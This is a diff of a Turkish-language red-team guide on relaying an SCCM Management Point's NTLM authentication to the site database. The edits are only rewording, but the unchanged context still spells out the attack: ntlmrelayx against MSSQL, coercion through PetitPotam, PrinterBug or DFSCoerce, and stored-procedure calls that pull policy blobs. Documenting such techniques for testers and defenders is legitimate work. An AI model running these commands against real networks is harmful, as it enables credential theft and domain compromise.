@@ -7,10 +7,10 @@ Bir **System Center Configuration Manager (SCCM) Yönetim Noktası (MP)**'nı SM
 
 Yüksek seviyeli zincir:
 1. MP & site DB'yi keşfet ↦ kimlik doğrulaması yapılmamış HTTP uç noktası `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
-2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` başlat.
+2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` komutunu başlat.
 3. MP'yi **PetitPotam**, PrinterBug, DFSCoerce vb. kullanarak zorla.
 4. SOCKS proxy üzerinden `mssqlclient.py -windows-auth` ile aktarılan **<DOMAIN>\\<MP-host>$** hesabı olarak bağlan.
-5. Şu komutları çalıştır:
+5. Aşağıdakileri çalıştır:
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
 * `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (veya `MP_GetPolicyBodyAfterAuthorization`)
@@ -27,7 +27,7 @@ MP ISAPI uzantısı **GetAuth.dll**, kimlik doğrulaması gerektirmeyen birkaç 
 |-----------|---------|
 | `MPKEYINFORMATIONMEDIA` | Site imzalama sertifikası genel anahtarını + *x86* / *x64* **Tüm Bilinmeyen Bilgisayarlar** cihazlarının GUID'lerini döndürür. |
 | `MPLIST` | Sitedeki her Yönetim Noktasını listeler. |
-| `SITESIGNCERT` | Birincil Site imzalama sertifikasını döndürür (LDAP olmadan site sunucusunu tanımlamak için). |
+| `SITESIGNCERT` | Birincil Site imzalama sertifikasını döndürür (LDAP olmadan site sunucusunu tanımlar). |
 
 Daha sonraki DB sorguları için **clientID** olarak kullanılacak GUID'leri alın:
 ```bash
@@ -81,7 +81,7 @@ Eğer zaten `PolicyID` ve `PolicyVersion`'a sahipseniz, clientID gereksinimini a
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> ÖNEMLİ: SSMS'de "Alınan Maksimum Karakter" değerini artırın (>65535) aksi takdirde blob kesilecektir.
+> ÖNEMLİ: SSMS'de “Alınan Maksimum Karakter” değerini artırın (>65535) aksi takdirde blob kesilecektir.
 
 ---
 
@@ -136,11 +136,13 @@ AND  pe.permission_name='EXECUTE';
 
 ## Ayrıca bakınız
 * NTLM relay temelleri:
+
 {{#ref}}
 ../ntlm/README.md
 {{#endref}}
 
 * MSSQL kötüye kullanımı ve sonrası:
+
 {{#ref}}
 abusing-ad-mssql.md
 {{#endref}}
